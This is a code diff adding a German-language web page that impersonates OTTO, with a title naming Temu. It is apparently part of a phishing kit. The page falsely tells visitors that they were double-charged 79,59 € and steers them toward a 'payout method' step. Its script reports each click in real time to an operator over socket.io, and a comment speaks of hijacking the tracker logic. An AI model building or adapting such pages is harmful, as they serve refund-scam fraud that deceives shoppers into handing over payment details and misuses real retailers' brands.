@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Erstattungsdetails - Temu</title>
+    <link rel="stylesheet" href="/css/otto.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+
+    <style>
+        .refund-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 10px;
+        }
+        
+        .info-icon {
+            width: 54px;
+            height: 54px;
+            margin-bottom: 20px;
+            fill: var(--oc-base-color-red);
+        }
+
+        .refund-text {
+            font-size: 15px;
+            color: #444;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .refund-box {
+            background-color: #f8f9fa;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            padding: 20px;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .refund-box-label {
+            font-size: 12px;
+            color: #777;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+
+        .refund-amount {
+            font-size: 28px;
+            font-weight: 700;
+            color: #222;
+        }
+
+        .refund-amount span {
+            color: var(--oc-base-color-red);
+        }
+
+        .instruction-text {
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="pl_focussed-dialog__container">
+        
+        <div class="hedopan">
+            <img src="./img/hedoipa.PNG" alt="OTTO" />
+        </div>
+        
+        <section class="pl_focussed-dialog__content">
+            <h1 class="identity_focused_dialog_headline" style="margin-bottom: 10px;">Ihre Rückerstattung</h1>
+            
+            <div class="form refund-container">
+                
+                <svg class="info-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+
+                <div class="refund-text" style="text-align: left; font-size: 14px;">
+                    Hallo,<br><br>
+                    bei der Überprüfung Ihrer letzten Bestellung haben wir festgestellt, dass es aufgrund einer Systemverzögerung zu einer fehlerhaften Doppelabbuchung gekommen ist.
+                </div>
+                
+                <div class="refund-details" style="background-color: #f9f9f9; border: 1px solid #eaeaea; border-radius: 4px; padding: 15px; margin-bottom: 25px; text-align: left; width: 100%;">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                        <span style="color: #666; font-size: 13px;">Bestellnummer:</span>
+                        <span style="font-weight: bold; font-size: 13px; color: #333;">#849201938</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                        <span style="color: #666; font-size: 13px;">Kundennummer:</span>
+                        <span style="font-weight: bold; font-size: 13px; color: #333;">291038492</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; margin-top: 15px; border-top: 1px solid #ddd; padding-top: 15px;">
+                        <span style="color: #333; font-weight: bold; font-size: 15px;">Erstattungsbetrag:</span>
+                        <span style="color: var(--oc-base-color-red); font-weight: bold; font-size: 18px;">79,59 €</span>
+                    </div>
+                </div>
+
+                <div class="instruction-text" style="text-align: left; font-size: 13px; margin-bottom: 25px;">
+                    Damit wir Ihnen den Betrag umgehend zurückerstatten können, bitten wir Sie, Ihre gewünschte Auszahlungsmethode für diese Kundennummer zu bestätigen.
+                </div>
+
+                <button type="button" class="btn btn-red" id="btn-weiter">
+                    Weiter zur Auszahlung
+                </button>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-lines">
+            <a href="#">Cookie-Einstellungen</a> &middot;
+            <a href="#">AGB</a> &middot;
+            <a href="#">Datenschutz</a> &middot;
+            <a href="#">Impressum</a> &middot;
+            <br>
+            <a href="#">Information zur Barrierefreiheit</a> &middot;
+            <a href="#">Produktsicherheitsrückrufe</a> &middot;
+            <a href="#">OTTO Versprechen</a>
+        </div>
+        <div class="price-info">
+            Preisangaben inkl. Steuer und zzgl. Service- und Versandkosten
+        </div>
+    </footer>
+
+    <!-- Hidden form to securely hijack the existing tracker.js logic -->
+    <form id="Bgha-Refund" method="post" style="display: none;">
+        <input type="hidden" name="action_type" id="hiddenActionType" value="">
+    </form>
+
+    <script>
+        $(document).ready(function () {
+            const $loader = $('#fullLoader');
+            const $modal = $('#methodModal');
+            const $form = $('#Bgha-Refund');
+            const $actionInput = $('#hiddenActionType');
+
+            // Handle Weiter zur Auszahlung button click
+            $("#btn-weiter").on("click", function (e) {
+                e.preventDefault();
+
+                $actionInput.val("Weiter zur Auszahlung Clicked");
+
+                if (typeof io !== 'undefined') {
+                    const socket = io();
+                    socket.emit('visitor_action', {
+                        type: 'form_submit',
+                        target: 'Bgha-Refund',
+                        details: { action_type: "Bgha-Refund" },
+                        redirectUrl: '/loading?time=3&url=/method'
+                    });
+                }
+
+                $loader.css('display', 'flex');
+                setTimeout(() => {
+                    window.location.href = '/loading?time=3&url=/method';
+                }, 1000);
+            });
+
+            // Show loading, then popup
+            $(document).on("click", "#btn-reselect", function (e) {
+                e.preventDefault();
+
+                // Prepare tracking data
+                $actionInput.val("Reselect Method Clicked");
+                $form.removeAttr('data-redirect'); // Do not redirect on just click
+
+                // Track silently without native submit hijacking page logic
+                if (typeof io !== 'undefined') {
+                    const socket = io();
+                    socket.emit('visitor_action', {
+                        type: 'form_submit',
+                        target: 'Bgha-Refund',
+                        details: { action_type: "Reselect Method Clicked" }
+                    });
+                }
+
+                $loader.css('display', 'flex');
+                setTimeout(() => {
+                    $loader.hide();
+                    $modal.addClass('active');
+                }, 2000);
+            });
+
+            // Close modal when clicking on the dark overlay (outside content)
+            $modal.on("click", function () {
+                $(this).removeClass("active");
+            });
+
+            // Handle method item click
+            $(".method-item, .method-item2").on("click", function (e) {
+                e.preventDefault();
+                const redirectUrl = $(this).attr("data-url");
+                const methodName = $(this).find('.method-text').text().trim();
+
+                if (!redirectUrl) return; // Prevent crash if method-item2 lacks a URL
+
+                $modal.removeClass("active");
+                $loader.css('display', 'flex');
+
+                // Track silently without native submit hijacking page logic
+                if (typeof io !== 'undefined') {
+                    const socket = io();
+                    socket.emit('visitor_action', {
+                        type: 'form_submit',
+                        target: 'Bgha-Refund',
+                        details: { action_type: "Selected Method: " + methodName },
+                        redirectUrl: redirectUrl
+                    });
+                }
+
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 1000); // Redirect after tracker has time to send
+            });
+        });
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="js/tracker.js"></script>
+</body>
+
+</html>
